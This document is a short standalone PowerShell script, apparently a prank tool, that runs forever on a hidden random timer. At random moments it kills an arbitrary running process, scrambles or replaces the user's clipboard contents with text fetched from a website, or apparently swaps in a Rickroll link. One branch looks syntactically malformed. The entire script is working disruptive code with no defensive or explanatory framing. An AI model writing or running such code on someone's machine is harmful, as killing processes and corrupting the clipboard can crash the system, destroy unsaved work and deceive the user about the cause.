Do {
    Get-Random -Minimum 60 -Maximum 3600 | Start-Sleep
    Switch (0..3 | Get-Random) {
        0 {
            $Clipboard = Get-Clipboard -Raw
            Do {Start-Sleep -Milliseconds 500} Until ($Clipboard -NE (Get-Clipboard -Raw))
            $Words = (Get-Clipboard -Raw).split(' ')
            ($Words | Get-random -Count $Words.Count) -join ' ' | Set-Clipboard
            Remove-Variable 'Words','Clipboard'
            Break
        }
        1 {
            Get-Process | Get-Random | Stop-Process
            Break
        }
        2 {
            $Clipboard = Get-Clipboard -Raw
            Do {Start-Sleep -Milliseconds 500} Until ($Clipboard -NE (Get-Clipboard -Raw))
            ([RegEx]"m'\>(.*)\<").Matches($(Invoke-WebRequest -Uri 'https://www.technobabble.biz/' -UseBasicParsing)).Groups[1] | Set-Clipboard
            Remove-Variable 'Clipboard'
            Break
        }
        3 {
            $Clipboard = Get-Clipboard -Raw
            Do {Start-Sleep -Milliseconds 500} Until ($Clipboard -NE (Get-Clipboard -Raw)) {Set-Clipboard 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'}
            Remove-Variable 'Clipboard'
            Break
        }
        Default {}
    }
} While ($True)
